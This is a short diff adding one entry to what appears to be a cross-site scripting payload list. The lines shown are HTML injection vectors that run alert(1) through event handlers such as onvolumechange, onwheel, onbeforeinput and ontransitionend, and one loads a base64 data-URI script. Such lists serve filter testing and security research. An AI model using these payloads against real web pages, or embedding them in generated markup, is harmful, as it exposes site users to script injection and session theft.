@@ -956,6 +956,7 @@ code
 <video autoplay controls onvolumechange=alert(1)><source src=\"validvideo.mp4\" type=\"video\/mp4\"><\/video>
 <audio autoplay controls onvolumechange=alert(1)><source src=\"validaudio.wav\" type=\"audio\/wav\"><\/audio>
 <body onwheel=alert(1)>
+<* contenteditable onbeforeinput=alert(1)>test
 <xss class=progress-bar-animated onanimationstart=alert(1)>
 <xss class=\"carousel slide\" data-ride=carousel data-interval=100 ontransitionend=alert(1)><xss class=carousel-inner><xss class=\"carousel-item active\"></xss><xss class=carousel-item></xss></xss></xss>
 <script src=data:text/javascript;base64,YWxlcnQoMSk=><\/script>
